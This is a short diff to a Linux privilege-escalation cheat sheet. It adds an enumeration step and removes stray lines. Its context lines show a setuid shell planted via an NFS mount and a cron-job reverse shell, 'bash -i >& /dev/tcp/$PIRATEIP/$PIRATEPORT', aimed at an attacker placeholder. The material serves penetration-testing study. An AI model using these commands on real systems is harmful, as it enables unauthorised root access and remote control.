@@ -45,6 +45,7 @@ There are 3 great script to automate privesc enumerations (test in this order):
 
 #### Manual
 
+* `ls /opt /tmp ...` : look around the file system for obvious paths
 * `history` : the current shell's history
 * `id` : look at the current user and it's rights
 * `sudo -l` : look for the sudo rights, maybe a command can be abused
@@ -195,8 +196,6 @@ sudo chmod +xs $NFS_MOUNTPOINT/shell
 On the target, execute the malicious binary
 
 ### Mysql UDF
-
-If
 
 * mysql is installed as root
 * "root" user for the service does not have a password assigned
@@ -376,10 +375,6 @@ echo "bash -i >& /dev/tcp/$PIRATEIP/$PIRATEPORT 0>&1" > $VULNERABLESCRIPT
 ```
 
 #### Permissive PATH
-
-The PATH used by cron jobs may be modified in `/etc/crontab`.
-
-If
 
 * a cron is running as root
 * it's using this path to discovert an executable position
